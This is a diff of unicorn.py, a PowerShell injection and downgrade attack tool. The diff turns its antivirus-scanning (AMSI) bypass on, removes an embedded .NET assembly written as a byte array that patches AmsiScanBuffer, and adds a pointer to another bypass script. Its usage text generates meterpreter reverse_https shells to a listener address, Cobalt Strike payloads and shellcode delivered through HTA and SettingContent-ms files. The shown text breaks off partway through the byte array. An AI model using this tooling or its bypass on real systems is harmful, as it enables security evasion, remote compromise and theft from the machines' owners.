@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 #
 # Magic Unicorn - PowerShell downgrade attack and exploitation tool
 #
@@ -62,7 +62,7 @@ except NameError: pass
 
 # This will append the AMSI bypass code which is longer than 8191 characters. You will want to turn this off 
 # if you need a payload that works with cmd.exe as it has a character length restriction size.
-AMSI_BYPASS="OFF"
+AMSI_BYPASS="ON"
 
 # This will print out the fully decoded command for you instead of running it through the powershell obfuscated
 # code.
@@ -146,7 +146,7 @@ def gen_unicorn():
                          |___\        \___:            \___:
 
 
-aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=
+aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMjAvMDUvc29ub2ZhLmpwZw==
 
                 """)
 
@@ -459,7 +459,7 @@ The four methods below on usage:
 
 HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
 HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
-HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+HTA Example SettingContent-ms: python unicorn.py <path_to_shellcode.txt>: shellcode ms
 Generate .SettingContent-ms: python unicorn.py ms
 
 The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
@@ -488,14 +488,14 @@ Usage:
 
 python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
 python unicorn.py <cobalt_strike_file.cs cs ms
-python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+python unicorn.py <path_to_shellcode.txt>: shellcode ms
 python unicorn.py ms
 
 """)
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.8.1 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.12 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -524,11 +524,9 @@ def gen_usage():
     print("Generate .SettingContent-ms: python unicorn.py ms")
     print("Help Menu: python unicorn.py --help\n")
 
-# technique used from https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-# originally detailed here: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
+# Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1
 def bypass_amsi():
-    func = generate_random_string(5,10)
-    amsi_string=("""function %s{if(-not ([System.Management.Automation.PSTypeName]"%s").Type){[Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 162, 107, 61, 140, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 198, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 96, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 136, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 212, 43, 0, 0, 56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 212, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 136, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 16, 33, 0, 0, 196, 10, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 170, 0, 0, 0, 1, 0, 0, 17, 114, 1, 0, 0, 112, 40, 2, 0, 0, 6, 10, 6, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 19, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 6, 114, 107, 0, 0, 112, 40, 1, 0, 0, 6, 11, 7, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 137, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 27, 106, 40, 19, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 45, 12, 114, 253, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 25, 141, 22, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 20, 0, 0, 10, 25, 40, 21, 0, 0, 10, 19, 4, 22, 17, 4, 25, 40, 22, 0, 0, 10, 7, 31, 27, 40, 23, 0, 0, 10, 17, 4, 25, 40, 4, 0, 0, 6, 114, 115, 1, 0, 112, 40, 18, 0, 0, 10, 22, 42, 30, 2, 40, 24, 0, 0, 10, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 28, 3, 0, 0, 35, 126, 0, 0, 136, 3, 0, 0, 0, 4, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 136, 7, 0, 0, 196, 1, 0, 0, 35, 85, 83, 0, 76, 9, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 92, 9, 0, 0, 104, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 26, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 24, 0, 0, 0, 15, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 169, 2, 1, 0, 0, 0, 0, 0, 6, 0, 209, 1, 34, 3, 6, 0, 62, 2, 34, 3, 6, 0, 5, 1, 240, 2, 15, 0, 66, 3, 0, 0, 6, 0, 45, 1, 191, 2, 6, 0, 180, 1, 191, 2, 6, 0, 149, 1, 191, 2, 6, 0, 37, 2, 191, 2, 6, 0, 241, 1, 191, 2, 6, 0, 10, 2, 191, 2, 6, 0, 68, 1, 191, 2, 6, 0, 25, 1, 3, 3, 6, 0, 247, 0, 3, 3, 6, 0, 120, 1, 191, 2, 6, 0, 95, 1, 109, 2, 6, 0, 128, 3, 184, 2, 6, 0, 220, 0, 34, 3, 6, 0, 210, 0, 184, 2, 6, 0, 233, 2, 184, 2, 6, 0, 170, 0, 184, 2, 6, 0, 232, 2, 184, 2, 6, 0, 92, 2, 184, 2, 6, 0, 81, 3, 34, 3, 6, 0, 205, 3, 184, 2, 6, 0, 151, 0, 184, 2, 6, 0, 148, 2, 3, 3, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 125, 0, 96, 3, 65, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 65, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 73, 0, 2, 0, 7, 0, 51, 1, 78, 0, 90, 0, 0, 0, 0, 0, 128, 0, 150, 32, 103, 3, 94, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 216, 3, 100, 0, 3, 0, 0, 0, 0, 0, 128, 0, 150, 32, 150, 3, 105, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 231, 3, 114, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 143, 0, 121, 0, 11, 0, 6, 33, 0, 0, 0, 0, 134, 24, 226, 2, 6, 0, 11, 0, 0, 0, 1, 0, 178, 0, 0, 0, 2, 0, 186, 0, 0, 0, 1, 0, 195, 0, 0, 0, 1, 0, 118, 3, 0, 0, 2, 0, 97, 2, 0, 0, 3, 0, 165, 3, 2, 0, 4, 0, 135, 3, 0, 0, 1, 0, 190, 3, 0, 0, 2, 0, 139, 0, 0, 0, 3, 0, 104, 2, 9, 0, 226, 2, 1, 0, 17, 0, 226, 2, 6, 0, 25, 0, 226, 2, 10, 0, 41, 0, 226, 2, 16, 0, 49, 0, 226, 2, 16, 0, 57, 0, 226, 2, 16, 0, 65, 0, 226, 2, 16, 0, 73, 0, 226, 2, 16, 0, 81, 0, 226, 2, 16, 0, 89, 0, 226, 2, 16, 0, 97, 0, 226, 2, 21, 0, 105, 0, 226, 2, 16, 0, 113, 0, 226, 2, 16, 0, 121, 0, 226, 2, 16, 0, 137, 0, 226, 2, 6, 0, 153, 0, 221, 2, 34, 0, 153, 0, 242, 3, 37, 0, 161, 0, 200, 0, 43, 0, 169, 0, 178, 3, 48, 0, 185, 0, 195, 3, 53, 0, 209, 0, 135, 2, 61, 0, 209, 0, 211, 3, 66, 0, 153, 0, 209, 2, 75, 0, 129, 0, 226, 2, 6, 0, 46, 0, 11, 0, 125, 0, 46, 0, 19, 0, 134, 0, 46, 0, 27, 0, 165, 0, 46, 0, 35, 0, 174, 0, 46, 0, 43, 0, 190, 0, 46, 0, 51, 0, 190, 0, 46, 0, 59, 0, 190, 0, 46, 0, 67, 0, 174, 0, 46, 0, 75, 0, 196, 0, 46, 0, 83, 0, 190, 0, 46, 0, 91, 0, 190, 0, 46, 0, 99, 0, 220, 0, 46, 0, 107, 0, 6, 1, 46, 0, 115, 0, 19, 1, 99, 0, 123, 0, 97, 1, 1, 0, 3, 0, 0, 0, 4, 0, 26, 0, 1, 0, 156, 2, 0, 1, 3, 0, 103, 3, 1, 0, 0, 1, 5, 0, 216, 3, 1, 0, 0, 1, 7, 0, 150, 3, 1, 0, 0, 1, 9, 0, 228, 3, 2, 0, 204, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 119, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 81, 0, 130, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 109, 115, 99, 111, 114, 108, 105, 98, 0, 115, 114, 99, 0, 68, 105, 115, 97, 98, 108, 101, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 71, 117, 105, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 86, 105, 115, 105, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 114, 97, 100, 101, 109, 97, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 68, 101, 115, 99, 114, 105, 112, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 112, 121, 114, 105, 103, 104, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 75, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 46, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 115, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 99, 0, 104, 0, 97, 0, 110, 0, 103, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 77, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 32, 0, 104, 0, 97, 0, 115, 0, 32, 0, 98, 0, 101, 0, 101, 0, 110, 0, 32, 0, 97, 0, 112, 0, 112, 0, 108, 0, 105, 0, 101, 0, 100, 0, 46, 0, 0, 0, 0, 0, 77, 203, 161, 57, 40, 124, 239, 68, 156, 240, 131, 50, 130, 195, 248, 87, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 4, 32, 1, 1, 2, 7, 7, 5, 24, 24, 25, 9, 24, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 97, 17, 101, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 183, 122, 92, 86, 25, 52, 224, 137, 3, 6, 17, 16, 5, 0, 2, 24, 24, 14, 4, 0, 1, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 2, 0, 0, 0, 0, 0, 15, 1, 0, 10, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 0, 5, 1, 0, 0, 0, 0, 23, 1, 0, 18, 67, 111, 112, 121, 114, 105, 103, 104, 116, 32, 194, 169, 32, 32, 50, 48, 49, 56, 0, 0, 41, 1, 0, 36, 56, 99, 97, 49, 52, 99, 52, 57, 45, 54, 52, 52, 98, 45, 52, 48, 99, 102, 45, 98, 49, 99, 55, 45, 97, 53, 98, 100, 97, 101, 98, 48, 98, 50, 99, 97, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 77, 1, 0, 28, 46, 78, 69, 84, 70, 114, 97, 109, 101, 119, 111, 114, 107, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 52, 46, 53, 46, 50, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 20, 46, 78, 69, 84, 32, 70, 114, 97, 109, 101, 119, 111, 114, 107, 32, 52, 46, 53, 46, 50, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 221, 193, 71, 222, 0, 0, 0, 0, 2, 0, 0, 0, 101, 0, 0, 0, 12, 44, 0, 0, 12, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 105, 207, 113, 241, 18, 122, 72, 71, 173, 244, 95, 170, 153, 86, 158, 210, 1, 0, 0, 0, 67, 58, 92, 85, 115, 101, 114, 115, 92, 97, 110, 100, 114, 101, 92, 115, 111, 117, 114, 99, 101, 92, 114, 101, 112, 111, 115, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 111, 98, 106, 92, 82, 101, 108, 101, 97, 115, 101, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 112, 100, 98, 0, 153, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 179, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 44, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 140, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 104, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 26, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 109, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0, 0, 0, 0, 0, 0, 34, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 